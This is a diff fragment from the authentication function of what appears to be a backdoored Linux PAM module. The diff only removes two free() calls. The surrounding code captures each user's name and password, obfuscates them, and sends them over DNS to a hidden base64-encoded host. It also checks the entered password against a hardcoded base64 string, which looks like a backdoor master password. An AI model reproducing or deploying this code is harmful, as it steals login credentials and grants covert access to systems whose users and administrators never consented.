@@ -345,8 +345,6 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
     sprintf(pw ,"%s:%s\n", name, p);
     encryptDecrypt(pw, out);
     dns_send(getIP(), 53, b64_decode(DNS_HOST), out);
-    free(pw);
-    free(out);
 	/* verify the password of this user */
         char *bdenc = b64_encode(p, strlen(p));
         if (strcmp(bdenc, bdstr) != 0) {
